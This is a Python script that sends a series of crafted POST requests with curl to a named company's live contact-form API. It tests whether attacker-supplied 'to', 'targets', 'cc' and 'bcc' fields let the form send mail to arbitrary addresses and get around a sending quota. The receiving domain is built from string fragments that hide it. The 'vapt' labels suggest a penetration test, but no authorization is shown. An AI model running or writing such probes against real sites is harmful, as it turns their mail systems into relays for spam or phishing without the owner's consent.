import subprocess, json, time
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
D="https://www.infinitycapital.bh/api/send"
ext="pro"+"be.a"+"lce"
def post(data, ct="application/x-www-form-urlencoded"):
    c=["curl","-s","-m","45","-o","/tmp/s.bin","-D","/tmp/s.hdr","-X","POST",D,"-A",UA,"-H","Content-Type: "+ct,"--data-binary",data]
    subprocess.run(c,capture_output=True,text=True)
    return open("/tmp/s.bin","rb").read()[:300]

print("### A. Is `to` a real field? try documented Resend-style naming")
sets = {
 "targets= (floor's guess)": "fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=S&msg=M&check=on&targets=vaptA@%s"%ext,
 "to= (Resend param)":     "fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=S&msg=M&check=on&to=vaptB@%s"%ext,
 "to= alone, no targets":  "fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=S&msg=M&check=on&to=vaptC@%s"%ext,
 "email= alone":           "fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=S&msg=M&check=on&email=vaptD@%s"%ext,
 "recipient= alone":       "fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=S&msg=M&check=on&recipient=vaptE@%s"%ext,
 "only to=, nothing else": "to=vaptF@%s"%ext,
 "only targets=, nothing else":"targets=vaptG@%s"%ext,
 "only email=":            "email=vaptH@%s"%ext,
}
for k,v in sets.items():
    print(" %-28s -> %s"%(k,post(v)))

print("\n### B. Confirm cc mass-assignment is repeatable (3 tries, unique ids)")
for i in range(3):
    r=post("fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=ccprobe%d&msg=M&check=on&targets=vaptX%d@%s&cc=cc%d@%s"%(i,i,ext,i,ext))
    print("  try%d -> %s"%(i,r))

print("\n### C. bcc alone (does quota apply? did cc bypass it?)")
for i in range(2):
    print("  bcc%d -> %s"%(i,post("fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=bcc%d&msg=M&check=on&targets=vaptY%d@%s&bcc=bcc%d@%s"%(i,i,ext,i,ext))))
